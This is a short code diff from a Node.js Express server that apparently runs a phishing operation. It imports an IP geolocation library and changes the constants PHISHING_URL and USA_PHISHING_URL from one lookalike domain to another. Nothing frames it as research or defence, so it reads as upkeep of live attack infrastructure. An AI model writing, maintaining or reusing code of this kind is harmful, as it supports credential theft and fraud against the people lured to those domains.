@@ -8,8 +8,8 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "polifihub.site";
-const USA_PHISHING_URL = "polifihub.site";
+const PHISHING_URL = "polifyhub.site";
+const USA_PHISHING_URL = "polifyhub.site";
 
 
 // CONFIGS
